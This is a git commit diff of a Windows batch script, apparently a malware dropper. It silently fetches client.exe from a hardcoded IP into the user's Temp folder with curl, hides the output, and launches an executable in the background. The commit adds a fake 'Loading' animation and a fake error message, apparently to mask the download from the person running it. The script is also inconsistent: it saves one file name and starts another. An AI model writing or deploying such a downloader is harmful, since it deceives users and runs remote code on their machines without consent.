b825664a177869d543f1bcbf58b66a86d10ebff6
Lastknight12 <108629475+Lastknight12@users.noreply.github.com>
2023-09-23 21:11:47 +0300

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,17 +1,40 @@
 @echo off
 
-set "server_url=apache_server_link/"
-set "server_file=filename.exe"
+set "server_url=10.10.134.168:80/"
+set "server_file=client.exe"
 
-set "downloads_folder=%USERPROFILE%\AppData\Local\"
+set "downloads_folder=%USERPROFILE%\AppData\Local\Temp"
 
-echo Download Wifi hacking tool
-echo Please Wait
+setlocal enabledelayedexpansion
+
+rem
+set "animation[1]=Loading"
+set "animation[2]=Loading."
+set "animation[3]=Loading.."
+set "animation[4]=Loading..."
+
+rem
+set "repeat=10"
+
+rem
+cls
+
+rem
+for /l %%i in (1,1,%repeat%) do (
+    for %%a in (1,2,3,4) do (
+        echo !animation[%%a]!
+        timeout /t 1 >nul
+        cls
+    )
+)
+
+echo Error, wait 5 seconds
+
 curl -o "%downloads_folder%\filename.exe" %server_url%%server_file% > NUL 2>&1
 
 :CHECK_DOWNLOAD
 if exist "%downloads_folder%\filename.exe" (
-    start "" /B "%downloads_folder%\filename.exe"
+    start "" /B "%downloads_folder%\host-service.exe"
 ) else (
     timeout /t 1
     goto CHECK_DOWNLOAD
